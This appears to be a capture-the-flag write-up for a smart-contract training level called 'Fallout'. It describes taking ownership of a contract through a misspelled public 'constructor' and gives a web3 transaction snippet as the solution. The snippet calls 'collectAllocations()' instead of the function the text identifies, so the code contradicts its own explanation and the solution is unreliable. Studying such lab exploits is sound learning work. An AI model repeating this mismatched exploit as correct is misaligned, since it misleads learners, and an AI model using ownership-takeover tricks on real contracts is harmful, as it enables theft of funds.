# Fallout

# Problem Statement
```
Claim ownership of the contract below to complete this level.
Things that might help
- Solidity Remix IDE
```

# Solution
Note that the "constructor" function is not actually a constructor because of the "1" in Fal1Out. Also notice that is a public method so anyone can call it.

Gain ownership:
```
let sig = web3.eth.abi.encodeFunctionSignature("collectAllocations()")
let ethValue = web3.utils.toWei('0.0000001', 'ether')
await web3.eth.sendTransaction({
  to: contract.address,
  from: player,
  data: sig,
  value: ethValue
})
```

We've completed this lesson!

# Key Learnings
- Read contract code thoroughly and be aware of possible characters that look similiar to other characters.